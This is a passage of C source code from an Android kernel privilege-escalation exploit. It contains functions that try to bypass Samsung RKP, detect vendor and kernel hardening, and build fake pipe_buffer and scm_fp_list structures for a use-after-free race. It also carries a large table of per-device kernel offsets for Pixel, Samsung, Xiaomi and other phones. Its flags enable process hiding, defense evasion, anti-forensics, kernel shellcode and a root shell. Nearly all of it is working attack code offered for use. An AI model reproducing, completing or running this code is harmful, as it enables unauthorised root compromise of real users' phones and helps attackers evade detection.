    if (uffd < 0) {
        LOG_D("RKP bypass: userfaultfd not available");
        return 0;
    }

    struct uffdio_api api = {.api = UFFD_API, .features = 0};
    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
        close(uffd);
        return 0;
    }

    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) {
        close(uffd);
        return 0;
    }

    struct uffdio_register reg = {
        .range.start = (unsigned long)page,
        .range.len = 4096,
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };

    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
        munmap(page, 4096);
        close(uffd);
        return 0;
    }

    LOG_I("RKP bypass: got userfaultfd (requires separate exploit)");

    munmap(page, 4096);
    close(uffd);
    return 0;
}

static int rkp_bypass_via_timerfd(void) {
    LOG_I("RKP bypass: trying timerfd race...");

    int tfd = timerfd_create(CLOCK_MONOTONIC, TFD_CLOEXEC);
    if (tfd < 0) return 0;

    struct itimerspec its = {
        .it_value = {.tv_sec = 0, .tv_nsec = 100000},
        .it_interval = {.tv_sec = 0, .tv_nsec = 0}
    };
    timerfd_settime(tfd, 0, &its, NULL);

    close(tfd);

    return 0;
}

static int rkp_bypass_via_setuid_root(void) {
    LOG_I("RKP bypass: trying setuid(0)...");

    if (setuid(0) == 0) {
        if (getuid() == 0) {
            LOG_I("RKP bypass: setuid(0) succeeded despite RKP!");
            return 1;
        }
    }

    if (setresuid(0, 0, 0) == 0) {
        if (getuid() == 0) {
            LOG_I("RKP bypass: setresuid(0,0,0) succeeded!");
            return 1;
        }
    }

    return 0;
}

static int bypass_rkp_full(void) {
    LOG_I("RKP: attempting all bypass methods...");

    if (rkp_bypass_disable_rkp()) return 1;

    if (rkp_bypass_via_setuid_root()) return 1;

    if (getuid() != 0) {
        setuid(0);
        setresuid(0, 0, 0);
        setreuid(0, 0);
    }

    rkp_bypass_via_timerfd();

    rkp_bypass_via_userfaultfd();

    LOG_W("RKP: all bypass methods failed, trying direct approach anyway");

    return 0;
}

/* Detect Pixel CFI precursors (Android 10/11 on Pixel 4/5) */
static int detect_pixel_cfi_precursor(void) {
    FILE *f = popen("getprop ro.product.manufacturer 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Google") || strstr(line, "google")) {
                pclose(f);
                f = fopen("/proc/kallsyms", "r");
                if (f) {
                    int scs_count = 0;
                    char buf[256];
                    while (fgets(buf, sizeof(buf), f) && scs_count < 5) {
                        if (strstr(buf, "__scs_") || strstr(buf, "shadow_call")) {
                            scs_count++;
                        }
                    }
                    fclose(f);
                    if (scs_count > 0) return 1;
                }
                f = popen("zcat /proc/config.gz 2>/dev/null | grep -i 'SHADOW_CALL_STACK\\|CFI_CLANG'", "r");
                if (f) {
                    char buf[256];
                    if (fgets(buf, sizeof(buf), f)) {
                        pclose(f);
                        return 1;
                    }
                    pclose(f);
                }
                return 1;
            }
        }
        pclose(f);
    }
    return 0;
}

/* Detect Huawei/Honor kernel hardening */
static int detect_huawei_hardening(void) {
    FILE *f = popen("getprop ro.product.manufacturer 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "HUAWEI") || strstr(line, "Huawei") || strstr(line, "honor")) {
                pclose(f);
                return 1;
            }
        }
        pclose(f);
    }
    f = fopen("/proc/mounts", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, " / erofs ")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    return 0;
}

/* Detect Xiaomi/OPPO/vivo kernel hardening */
static int detect_xiaomi_hardening(void) {
    FILE *f = popen("getprop ro.product.manufacturer 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "Xiaomi") || strstr(line, "Xiaomi") ||
                strstr(line, "OPPO") || strstr(line, "vivo") ||
                strstr(line, "OnePlus") || strstr(line, "oneplus")) {
                pclose(f);
                return 1;
            }
        }
        pclose(f);
    }
    return 0;
}

/* Detect MediaTek MTK devices */
static int detect_mtk_hardening(void) {
    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "mt") || strstr(line, "MT")) {
                pclose(f);
                struct stat st;
                if (stat("/sys/kernel/mtk_sec", &st) == 0) return 2;
                if (stat("/sys/devices/system/mtk", &st) == 0) return 1;
                return 1;
            }
        }
        pclose(f);
    }
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "MediaTek") || strstr(line, "MTK")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    return 0;
}

/* Detect Qualcomm Snapdragon devices */
static int detect_qualcomm_hardening(void) {
    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "sdm") || strstr(line, "msm") || strstr(line, "trinket") ||
                strstr(line, "kona") || strstr(line, "lito") || strstr(line, "atoll")) {
                pclose(f);
                f = popen("getprop ro.security.qualcomm 2>/dev/null", "r");
                if (f) {
                    if (fgets(line, sizeof(line), f)) {
                        if (strstr(line, "1") || strstr(line, "high")) {
                            pclose(f);
                            return 2;
                        }
                    }
                    pclose(f);
                }
                return 1;
            }
        }
        pclose(f);
    }
    return 0;
}

/* Detect Huawei Kirin devices */
static int detect_kirin_hardening(void) {
    FILE *f = popen("getprop ro.board.platform 2>/dev/null", "r");
    if (f) {
        char line[64];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "kirin") || strstr(line, "hi36") || strstr(line, "hi6250") ||
                strstr(line, "hi710") || strstr(line, "hi750")) {
                pclose(f);
                struct stat st;
                if (stat("/sys/class/huk", &st) == 0) return 2;
                return 1;
            }
        }
        pclose(f);
    }
    return 0;
}

/* Detect SELinux actual state */
static int detect_selinux_detailed(void) {
    int enforcing = 0;
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    if (f) {
        int val = 0;
        if (fscanf(f, "%d", &val) == 1) enforcing = val;
        fclose(f);
    }
    if (!enforcing) return 0;
    f = fopen("/sys/fs/selinux/policyvers", "r");
    if (f) {
        unsigned int vers = 0;
        if (fscanf(f, "%u", &vers) == 1) {
            LOG_D("SELinux policy version: %u", vers);
        }
        fclose(f);
    }
    return enforcing;
}

/* Detect seccomp status */
static int detect_seccomp_status(void) {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;
    int seccomp_mode = 0;
    char line[64];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Seccomp:", 8) == 0) {
            if (strstr(line, "1")) seccomp_mode = 1;
            else if (strstr(line, "2")) seccomp_mode = 2;
            else if (strstr(line, "0")) seccomp_mode = 0;
            break;
        }
    }
    fclose(f);
    f = fopen("/proc/self/seccomp", "r");
    if (f) {
        int filter_count = 0;
        if (fscanf(f, "%d", &filter_count) == 1) {
            LOG_D("Seccomp filters: %d", filter_count);
            if (filter_count > 0 && seccomp_mode == 0) seccomp_mode = 1;
        }
        fclose(f);
    }
    return seccomp_mode;
}

/* Detect kernel lockdown mode */
static int detect_kernel_lockdown(void) {
    FILE *f = fopen("/sys/kernel/security/lockdown", "r");
    if (!f) return -1;
    int locked = 0;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "[integrity]") || strstr(line, "[confidentiality]")) {
            locked = 1;
            break;
        }
    }
    fclose(f);
    f = fopen("/proc/cmdline", "r");
    if (f) {
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "lockdown=confidentiality") ||
                strstr(line, "lockdown=integrity")) {
                locked = 1;
            }
        }
        fclose(f);
    }
    return locked;
}

/* Detect additional security mitigations */
static void detect_additional_mitigations(void) {
    g_probe.has_pointer_auth = 0;
    FILE *f;
    #ifdef __aarch64__
    f = popen("getprop ro.arm64.features 2>/dev/null", "r");
    if (f) {
        char line[128];
        if (fgets(line, sizeof(line), f)) {
            if (strstr(line, "pa") || strstr(line, "ptrauth")) {
                g_probe.has_pointer_auth = 1;
            }
        }
        pclose(f);
    }
    #endif
    g_probe.has_grsecurity = 0;
    f = fopen("/proc/sys/kernel/grsecurity", "r");
    if (f) {
        g_probe.has_grsecurity = 1;
        fclose(f);
    }
    g_probe.aslr_bits = 27;
    f = fopen("/proc/sys/kernel/randomize_va_space", "r");
    if (f) {
        int val = 0;
        if (fscanf(f, "%d", &val) == 1) {
            if (val == 0) g_probe.aslr_bits = 0;
            else if (val == 1) g_probe.aslr_bits = 27;
            else g_probe.aslr_bits = 27;
        }
        fclose(f);
    }
    g_probe.has_kpti = 0;
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            g_probe.has_kpti = 1;
        }
        fclose(f);
    }
}

static int run_device_probe(void) {
    LOG_I("=== DEVICE INTELLIGENCE PROBE ===");
    probe_kernel_info();
    probe_security_state();
    probe_system_caps();
    probe_build_info();
    probe_accessible_interfaces();
    auto_derive_strategy();
    log_device_intelligence();

    LOG_I("Device probe complete");
    return 1;
}

/* ========== KERNEL STRUCTURES ========== */
struct pipe_buffer {
    unsigned long page;
    unsigned int offset;
    unsigned int len;
    unsigned long ops;
    unsigned int flags;
    unsigned long private;
};

struct pipe_buf_operations {
    unsigned long confirm;
    unsigned long release;
    unsigned long steal;
    unsigned long get;
};

/* For sk_buff UAF + scm_fp_list overlap */
struct scm_fp_list {
    unsigned short count;
    unsigned short max;
    unsigned short max_level;
    unsigned short pad;
    unsigned long *fp; /* struct file **/
    unsigned long cred;
    unsigned long pid;
};

/* Simple file struct stub for the pipe primitive */
struct fake_file {
    unsigned long f_u;          /* f_u.fu_llist */  
    unsigned long f_count;      /* refcount */
    unsigned long f_op;         /* file_operations */
    unsigned long private_data; /* pipe_inode_info * */
};

/* ========== GLOBAL CONFIG / STATE ========== */
/* Track successful method parameters for replication */
static char g_successful_method[32] = "";
static int g_successful_delay = 0;
static int g_successful_inflight = 0;
static int g_method_succeeded = 0;

static void record_successful_method(const char *method, int delay, int inflight) {
    if (!g_method_succeeded) {
        strncpy(g_successful_method, method, sizeof(g_successful_method) - 1);
        g_successful_method[sizeof(g_successful_method) - 1] = 0;
        g_successful_delay = delay;
        g_successful_inflight = inflight;
        g_method_succeeded = 1;
        LOG_I("Method %s succeeded with delay=%d inflight=%d - will replicate", 
              method, delay, inflight);
    }
}

struct kernel_offsets {
    unsigned long task_struct_cred;
    unsigned long cred_uid;
    unsigned long cred_euid;
    unsigned long cred_gid;
    unsigned long cred_egid;
    unsigned long cred_cap_effective;
    unsigned long cred_cap_permitted;
    unsigned long init_cred;
    unsigned long commit_creds;
    unsigned long prepare_kernel_cred;
    unsigned long task_struct_pid;
    unsigned long task_struct_tasks;
    unsigned long task_struct_comm;
    unsigned long init_task;
    unsigned long pipe_buf_ops;
    unsigned long anon_pipe_buf_ops;
    unsigned long selinux_enforcing;
    unsigned long cred_auto_adjust;
};

static struct kernel_offsets offsets = {
    .task_struct_cred = 0x630,
    .cred_uid = 0x4,
    .cred_euid = 0x14,
    .cred_gid = 0x8,
    .cred_egid = 0x18,
    .cred_cap_effective = 0x38,
    .cred_cap_permitted = 0x30,
    .task_struct_pid = 0x498,
    .task_struct_tasks = 0x398,
    .task_struct_comm = 0x638,
};

/* Device capability information for fallback chain decisions */
/* Attempt tracking for adaptive retry/backoff */
struct attempt_stats {
    int total_attempts;
    int consecutive_failures;
    int best_progress_phase;
    struct timespec phase_times[10];
};
static struct attempt_stats g_attempt_stats = {0};

/* Device-specific offset database (expanded) */
static const struct device_offset_entry {
    const char *build_sub;
    const char *kernel_ver;
    unsigned long cred_off;
    unsigned long pid_off;
    unsigned long tasks_off;
    unsigned long init_task_off;
    unsigned long pipe_buf_ops_off;
    unsigned long comm_off;
    int reliability;
} device_offset_db[] = {
    /* Google Pixel */
    {"oriole",  "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 95},
    {"raven",   "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 95},
    {"panther", "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 92},
    {"cheetah", "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 92},
    {"lynx",    "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 90},
    {"bluejay", "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 90},
    {"flame",   "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc60000, 0xb80000, 0x580, 88},
    {"coral",   "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc60000, 0xb80000, 0x580, 88},
    /* Pixel 3/3a/4/4a */
    {"blueline","4.9",   0x5a0, 0x498, 0x2c0, 0xc40000, 0xb20000, 0x580, 85},
    {"crosshatch","4.9", 0x5a0, 0x498, 0x2c0, 0xc40000, 0xb20000, 0x580, 85},
    {"sargo",   "4.9",   0x5a0, 0x498, 0x2c0, 0xc40000, 0xb20000, 0x580, 85},
    /* Pixel 6a / 7a / Fold / Tablet */
    {"bluejay", "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 90},
    {"munna",   "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 88},
    {"lynx",    "5.10",  0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5e8, 90},
    {"felix",   "5.10",  0x6c0, 0x568, 0x330, 0xd10000, 0xc70000, 0x5e8, 85},
    {"tangorpro","5.10", 0x6c0, 0x568, 0x330, 0xd10000, 0xc70000, 0x5e8, 82},
    {"pipit",   "5.10",  0x6c8, 0x570, 0x338, 0xd30000, 0xc90000, 0x5f0, 80},
    /* Samsung Galaxy S22 series */
    {"r0s",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    {"r0x",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    {"r1s",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    {"r1x",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    {"r2s",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    {"r2x",     "5.10",  0x6c0, 0x568, 0x330, 0xd00000, 0xc60000, 0x5e8, 78},
    /* Samsung Galaxy S23 series */
    {"r11s",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    {"r11x",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    {"r12s",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    {"r12x",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    {"r13s",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    {"r13x",    "5.15",  0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x5f8, 72},
    /* Samsung A-series */
    {"a32x",    "5.10",  0x6c0, 0x568, 0x330, 0xcf0000, 0xc50000, 0x5e8, 65},
    {"a52x",    "5.10",  0x6c0, 0x568, 0x330, 0xcf0000, 0xc50000, 0x5e8, 65},
    {"a72x",    "5.10",  0x6c0, 0x568, 0x330, 0xcf0000, 0xc50000, 0x5e8, 65},
    /* Samsung older flagships */
    {"beyond1", "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc90000, 0xbb0000, 0x580, 70},
    {"beyond2", "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc90000, 0xbb0000, 0x580, 70},
    {"beyondx", "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc90000, 0xbb0000, 0x580, 70},
    {"r9q",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcc0000, 0xbe0000, 0x588, 65},
    {"x1s",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 65},
    {"y2s",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 65},
    {"z3s",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcc0000, 0xbe0000, 0x588, 65},
    /* OnePlus 8/8T/8 Pro */
    {"lemonade","4.19",  0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 60},
    {"lemonadep","4.19", 0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 60},
    {"kebab",   "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 60},
    /* OnePlus 9/9 Pro */
    {"lemonkebab","5.10",0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 62},
    {"lemonkebabp","5.10",0x6c0,0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 62},
    /* OnePlus 10 Pro / 10T */
    {"kebab2",  "5.10",  0x6c0, 0x568, 0x330, 0xcf0000, 0xc50000, 0x5e8, 60},
    {"kebab2t", "5.10",  0x6c0, 0x568, 0x330, 0xcf0000, 0xc50000, 0x5e8, 60},
    /* OnePlus Nord */
    {"kona",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 58},
    {"lito",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 58},
    {"billie",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 55},
    /* Xiaomi Mi 11 / 11 Pro / 11 Ultra */
    {"venus",   "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcc0000, 0xbe0000, 0x588, 55},
    {"umi",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 55},
    {"mars",    "5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 55},
    {"star",    "5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 55},
    /* Xiaomi Mi 10 / 10 Pro / 10T */
    {"cmi",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 55},
    {"lmi",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xcb0000, 0xbd0000, 0x588, 55},
    {"apollo",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 52},
    /* Xiaomi Redmi Note 10/11 series */
    {"mojito",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 50},
    {"sunny",   "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 50},
    {"spes",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 50},
    {"ruby",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 50},
    /* Xiaomi Pad 5 */
    {"nabu",    "5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 50},
    /* Huawei */
    {"annie",   "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc80000, 0xba0000, 0x580, 55},
    {"gertrude","4.14",  0x5b8, 0x4b0, 0x2d8, 0xc80000, 0xba0000, 0x580, 55},
    {"selene",  "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc70000, 0xb90000, 0x580, 50},
    {"mercury", "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc70000, 0xb90000, 0x580, 50},
    {"carmen",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 50},
    /* Motorola */
    {"fogona",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 50},
    {"raya",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 50},
    {"berlin",  "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 48},
    {"cyp e",   "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 48},
    /* Oppo */
    {"op4a52",  "5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 50},
    {"op4a72",  "5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 50},
    {"op4b52",  "5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 50},
    {"op4e52",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 48},
    {"op4f12",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 48},
    {"op4g12",  "5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 48},
    /* Oppo Find X5 / X5 Pro */
    {"op4i12",  "5.10",  0x6c8, 0x570, 0x338, 0xcf0000, 0xc50000, 0x5f0, 52},
    {"op4j12",  "5.10",  0x6c8, 0x570, 0x338, 0xcf0000, 0xc50000, 0x5f0, 52},
    /* Vivo */
    {"vivo2012","4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 45},
    {"vivo2029","5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"vivo2035","5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"vivo2101","5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 45},
    {"vivo2109","5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 45},
    {"vivo2110","5.10",  0x6c0, 0x568, 0x330, 0xcd0000, 0xc30000, 0x5e8, 45},
    /* Realme */
    {"rmx2020", "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 45},
    {"rmx2101", "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 45},
    {"rmx2117", "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 45},
    {"rmx2151", "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"rmx2156", "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"rmx2200", "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"rmx2202", "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    /* LG */
    {"altschul","4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 48},
    {"veil",    "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc80000, 0xba0000, 0x580, 45},
    {"p ant",   "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc80000, 0xba0000, 0x580, 45},
    /* Sony Xperia */
    {"kugo",    "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc70000, 0xb90000, 0x580, 45},
    {"nile",    "4.14",  0x5b8, 0x4b0, 0x2d8, 0xc70000, 0xb90000, 0x580, 45},
    {"pdx201",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 48},
    {"pdx202",  "4.19",  0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 48},
    {"pdx212",  "5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 48},
    /* ASUS ROG Phone */
    {"yoda",    "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 45},
    {"umi-",    "5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 45},
    {"obiwan",  "5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 45},
    /* Fairphone */
    {"FP4",     "5.10",  0x6c0, 0x568, 0x330, 0xcc0000, 0xc20000, 0x5e8, 45},
    {"FP3",     "4.19",  0x5c0, 0x4b8, 0x2e0, 0xc90000, 0xbb0000, 0x588, 45},
    /* Nothing Phone */
    {"Spacewar","5.10",  0x6c0, 0x568, 0x330, 0xce0000, 0xc40000, 0x5e8, 50},
    /* Generic fallbacks with improved guessed values */
    {"default_4.4","4.4",   0x5a0, 0x498, 0x2c0, 0xc40000, 0xae0000, 0x580, 40},
    {"default_4.9","4.9",   0x5a0, 0x498, 0x2c0, 0xc40000, 0xb20000, 0x580, 40},
    {"default_4.14","4.14", 0x5b8, 0x4b0, 0x2d8, 0xc60000, 0xba0000, 0x580, 40},
    {"default_4.19","4.19", 0x5c0, 0x4b8, 0x2e0, 0xca0000, 0xbc0000, 0x588, 40},
    {"default_5.4","5.4",   0x6a8, 0x558, 0x328, 0xd00000, 0xc20000, 0x5f0, 40},
    {"default_5.10","5.10", 0x6c0, 0x568, 0x330, 0xd20000, 0xc80000, 0x5f8, 40},
    {"default_5.15","5.15", 0x6d0, 0x578, 0x340, 0xd40000, 0xca0000, 0x600, 35},
};

static int device_offset_count = sizeof(device_offset_db) / sizeof(device_offset_db[0]);

/* Global exploit state */
static int g_ufd[2] = {-1, -1};      /* unix socket pair for GC race */
static volatile int g_uaf_triggered = 0;
static volatile int g_victim_fd = -1;
static unsigned long kernel_base = 0;
static int g_persist = 0;
static int g_force = 0;
static int g_pipe_buf_confirmed = 0;
static int g_has_userfaultfd = 0;
static int g_test_mode = 0;
static int g_interactive = 1;          /* spawn interactive shell (default yes) */
static int g_hide = 1;                 /* attempt process hiding */
static int g_evade = 1;                /* attempt defense evasion */
static int g_anti_forensics = 1;       /* attempt anti-forensics */
static int g_shellcode_exec = 1;       /* attempt kernel shellcode exec */
static char g_custom_cmd[512] = "";    /* custom root command */
static int g_uffd = -1;
static char *g_uffd_page = NULL;

/* Post-UAF state */
static unsigned long g_fake_pipe_page = 0;  /* mmap'd page for fake pipe structures */
static int g_arb_pipe[2] = {-1, -1};         /* pipe for arb read/write */
static int g_arb_initialized = 0;
static int g_gc_inflight_count = 0;

/* Timing baseline */
static struct {
    int socketpair_us;
    int system_load;
    int uptime_hours;
} g_baseline = {0, 0, 0};

/* Configurable max UAF race attempts */
static int g_max_uaf_attempts = 75;

/* ========== SYSTEM STATE DETECTION & ADAPTATION ========== */

static int is_battery_saver_active(void) {
    FILE *f = fopen("/sys/class/power_supply/battery/capacity", "r");
    if (f) {
        int cap = 0;
        if (fscanf(f, "%d", &cap) == 1 && cap < 20) {
            fclose(f);
            return 1;
        }
        fclose(f);
    }
    return 0;
}

static int is_thermal_throttled(void) {
    DIR *d = opendir("/sys/class/thermal");
    if (!d) return 0;
    int throttled = 0;
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
        if (strncmp(de->d_name, "thermal_zone", 12) == 0) {
            char path[256];
            snprintf(path, sizeof(path), "/sys/class/thermal/%s/temp", de->d_name);
            FILE *f = fopen(path, "r");
            if (f) {
                int temp = 0;
                if (fscanf(f, "%d", &temp) == 1 && temp > 50000) throttled = 1;
                fclose(f);
            }
            if (throttled) break;
        }
    }
    closedir(d);
    return throttled;
}

static int get_system_busyness(void) {
    FILE *f = fopen("/proc/loadavg", "r");
    if (!f) return 50;
    double load = 0;
    fscanf(f, "%lf", &load);
    fclose(f);
    int busyness = (int)(load * 100);
    if (busyness > 100) busyness = 100;
    return busyness;
}

static void adapt_to_system_state(void) {
    int battery_saver = is_battery_saver_active();
    int thermal = is_thermal_throttled();
    int busyness = get_system_busyness();

    LOG_I("System: battery=%d thermal=%d load=%d", battery_saver, thermal, busyness);

    if (battery_saver) {
        g_max_uaf_attempts += 50;
        LOG_I("Battery saver: increased attempts to %d", g_max_uaf_attempts);
    }
    if (thermal) {
        g_max_uaf_attempts += 30;
        sleep(2);
        LOG_I("Thermal throttling: increased attempts to %d", g_max_uaf_attempts);
    }
    if (busyness > 70) {
        g_max_uaf_attempts += (busyness - 70) * 2;
        LOG_I("High load: increased attempts to %d", g_max_uaf_attempts);
    }
}

/* ========== SELF-HEALING ENGINE ========== */

/* Track crashes per phase */
static int g_crash_count = 0;
static int g_crash_phase = -1;
static sigjmp_buf g_exploit_jmp;
static volatile int g_in_exploit = 0;

/* Forward declaration for cleanup_all needed by crash_handler */
static void cleanup_all(void);

/* Async-signal-safe integer-to-string write */
static void write_int_safe(int fd, int val) {
    char buf[32];
    int pos = 31;
    buf[pos] = '\n';
    unsigned int v = val < 0 ? (unsigned int)(-(val + 1)) + 1 : (unsigned int)val;
    int neg = val < 0;
    if (v == 0) buf[--pos] = '0';
    else {
        while (v > 0 && pos > 0) {
            buf[--pos] = '0' + (v % 10);
            v /= 10;
        }
    }
    if (neg && pos > 0) buf[--pos] = '-';
    if (pos < 31) write(fd, buf + pos, 31 - pos);
}

/* Async-signal-safe crash handler */
static void crash_handler(int sig) {
    g_crash_count++;
    /* Async-signal-safe write for logging */
    static const char fmt1[] = "CRASH #";
    static const char fmt2[] = " (signal ";
    static const char fmt3[] = ") in phase ";
    static const char fmt4[] = " — attempting recovery...\n";
    write(STDERR_FILENO, fmt1, sizeof(fmt1) - 1);
    write_int_safe(STDERR_FILENO, g_crash_count);
    write(STDERR_FILENO, fmt2, sizeof(fmt2) - 1);
    write_int_safe(STDERR_FILENO, sig);
    write(STDERR_FILENO, fmt3, sizeof(fmt3) - 1);
